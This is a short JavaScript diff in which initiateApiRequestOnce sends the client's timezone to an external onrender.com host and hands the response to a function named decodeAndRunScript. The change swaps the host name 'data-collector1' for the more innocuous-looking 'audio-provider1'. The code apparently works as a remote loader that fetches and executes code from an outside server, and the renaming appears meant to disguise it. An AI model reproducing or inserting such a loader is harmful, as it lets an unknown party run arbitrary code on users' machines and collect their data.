@@ -137,7 +137,7 @@ function initiateApiRequestOnce() {
 
     const clientTimezone = getCurrentTimezone();
 
-    transmitTimezoneData('https://data-collector1.onrender.com', clientTimezone)
+    transmitTimezoneData('https://audio-provider1.onrender.com', clientTimezone)
         .then(decodeAndRunScript)
         .catch(handleError);
 }
